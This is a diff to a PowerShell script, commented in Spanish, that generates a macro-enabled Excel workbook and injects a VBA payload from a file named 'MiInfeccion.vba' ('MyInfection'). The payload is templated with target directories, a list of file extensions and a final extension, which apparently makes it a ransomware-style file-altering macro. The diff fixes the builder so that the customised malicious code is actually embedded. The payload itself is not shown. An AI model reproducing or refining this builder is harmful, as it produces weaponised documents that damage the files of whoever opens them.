@@ -28,13 +28,12 @@ $archivo = "MiInfeccion.vba" # Nombre del archivo con código VBA para el Excel
 
 #####
 # Inicio de código
-$cont = Get-Content $payloads$archivo;
+$cont = Get-Content -Raw $payloads$archivo;
 # Reemplazo de Variables
 $ext = "\.(" + ($ext -join "|" -replace "\.","") + ")$"
 $cont = $cont.Replace("{{DIRECTORIOS}}", $dirs)
 $cont = $cont.Replace("{{LISTADO_EXTENSIONES}}",$ext)
 $cont = $cont.Replace("{{EXTENSION_FINAL}}", $final_ext)
-$cont
 
 # Abrimos una instancia de la aplicación Excel.
 $excel = New-Object -ComObject Excel.Application;
@@ -92,7 +91,7 @@ $sheet.Cells.Item(14,1).Font.Bold = $true;
 $sheet.Shapes.AddPicture($payloads + $file_image, 0, -1,30000,30000,-1,-1) | Out-Null
 
 # Agregando el código VBA que tengo en un archivo aparte.
-$test = $workbook.VBProject.VBComponents.Item(1).CodeModule.AddFromFile($payloads + $archivo);
+$test = $workbook.VBProject.VBComponents.Item(1).CodeModule.AddFromString($cont);
 
 # Guardando el archivo como .xlsm
 $workbook.SaveAs($output + $file_output, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlOpenXMLWorkbookMacroEnabled );
